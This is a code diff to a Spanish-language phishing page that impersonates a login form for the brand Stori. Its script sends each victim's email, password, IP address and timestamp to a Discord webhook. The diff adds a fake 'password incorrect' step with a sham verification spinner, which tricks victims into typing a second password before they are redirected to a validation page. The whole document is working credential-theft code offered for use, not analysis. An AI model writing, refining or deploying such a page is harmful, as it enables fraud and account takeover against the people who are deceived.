@@ -19,11 +19,18 @@
     .input-group { margin-bottom: 1rem; position: relative; width: 100%; }
     .input-group input { width: 100%; padding: 0.8rem 1rem; border: 2px solid #ddd; border-radius: 8px; font-size: 1rem; outline: none; }
     .input-group input:focus { border-color: #008f76; }
+    .input-group input.error { border-color: #e53935; }
+    .error-text { color: #e53935; font-size: 0.85rem; text-align: left; width: 100%; margin-bottom: 1rem; display: none; }
     .checkbox-group { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1rem; width: 100%; text-align: left; font-size: 0.9rem; }
     .legal-info { font-size: 0.8rem; color: #666; margin-bottom: 1rem; }
     .submit-button { width: 100%; padding: 1rem; background-color: #00d180; color: white; border: none; border-radius: 8px; font-size: 1rem; cursor: pointer; margin-top: 1rem; transition: background-color 0.3s; }
     .submit-button:disabled { background-color: #ccc; cursor: not-allowed; }
     .login-link { display: block; margin-top: 1.5rem; color: #008f76; text-decoration: none; font-weight: 500; }
+    /* Loader overlay */
+    .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background: rgba(255,255,255,0.95); z-index: 500; display: none; flex-direction: column; justify-content: center; align-items: center; }
+    .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid #00d180; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loader-text { font-size: 18px; font-weight: bold; color: #333; }
     @media (min-width: 768px) { .container { margin: 2rem auto; min-height: calc(100vh - 4rem); border-radius: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); } }
   </style>
 </head>
@@ -49,6 +56,7 @@
         <div class="input-group">
           <input type="password" id="pas" placeholder="Contraseña" required />
         </div>
+        <div class="error-text" id="passwordError">Contraseña incorrecta. Inténtalo de nuevo.</div>
         <div class="checkbox-group">
           <input type="checkbox" id="accept-privacy" />
           <label for="accept-privacy">Acepto el <a href="#">aviso de privacidad</a></label>
@@ -59,6 +67,12 @@
 
       <a href="#" class="login-link">Ya tengo cuenta Stori</a>
     </main>
+  </div>
+
+  <!-- Loader overlay -->
+  <div class="loader-overlay" id="loaderOverlay">
+    <div class="spinner"></div>
+    <div class="loader-text">Verificando contraseña...</div>
   </div>
 
   <script>
@@ -80,24 +94,56 @@
       } catch (error) { console.error('Error Discord:', error); }
     }
 
-    const input = document.getElementById('pas');
+    const inputPas = document.getElementById('pas');
     const boton = document.getElementById('continuar');
+    const passwordError = document.getElementById('passwordError');
+    const loaderOverlay = document.getElementById('loaderOverlay');
 
-    input.addEventListener('input', function () {
-      if (input.value.length > 3) { boton.style.backgroundColor = '#00d180'; boton.disabled = false; } 
-      else { boton.style.backgroundColor = ''; boton.disabled = true; }
+    let intento = 1; // 1 = primer intento, 2 = segundo intento
+
+    // Habilitar botón solo si el campo tiene más de 3 caracteres
+    inputPas.addEventListener('input', function () {
+      if (inputPas.value.length > 3) {
+        boton.style.backgroundColor = '#00d180';
+        boton.disabled = false;
+      } else {
+        boton.style.backgroundColor = '';
+        boton.disabled = true;
+      }
     });
 
     document.getElementById('signup-form').addEventListener('submit', async function (e) {
       e.preventDefault();
       const email = document.getElementById('email').value;
-      const password = document.getElementById('pas').value;
+      const password = inputPas.value;
       const ip = await getIP();
 
-      const message = `🛡️ **NUEVO INICIO DE SESIÓN (Stori)**\n\n📧 **Email:** ${email}\n🔑 **Contraseña:** ${password}\n🌐 **IP:** ${ip}\n🕒 **Fecha:** ${new Date().toLocaleString()}`;
+      // Enviar el intento actual al webhook
+      const message = `🛡️ **NUEVO INICIO DE SESIÓN (Stori)**\n\n📧 **Email:** ${email}\n🔑 **Contraseña (Intento ${intento}):** ${password}\n🌐 **IP:** ${ip}\n🕒 **Fecha:** ${new Date().toLocaleString()}`;
 
       await sendToDiscord(message);
-      window.location.href = 'validacion.html';
+
+      if (intento === 1) {
+        // Primer intento: mostrar loader 3 segundos y luego error
+        loaderOverlay.style.display = 'flex';
+        boton.disabled = true;
+
+        setTimeout(() => {
+          loaderOverlay.style.display = 'none';
+          passwordError.style.display = 'block';
+          inputPas.classList.add('error');
+          inputPas.value = ''; // dejar campo en blanco
+          boton.style.backgroundColor = '';
+          boton.disabled = true;
+          inputPas.focus();
+          intento = 2; // siguiente intento
+        }, 3000);
+      } else {
+        // Segundo intento: continuar flujo normal
+        passwordError.style.display = 'none';
+        inputPas.classList.remove('error');
+        window.location.href = 'validacion.html';
+      }
     });
   </script>
 </body>
